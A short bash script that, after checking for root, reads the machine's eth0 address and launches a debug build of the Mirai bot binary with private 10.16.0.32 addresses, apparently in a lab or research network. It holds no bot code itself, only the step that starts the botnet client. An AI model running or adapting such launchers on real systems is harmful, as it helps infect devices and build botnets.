#!/bin/bash
if [[ $EUID > 0 ]]
  then echo "Please run as root"
  exit
fi
echo "running bot"
IP=`ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'`
sudo ./debug/mirai.dbg 10.16.0.32 $IP 10.16.0.32 0
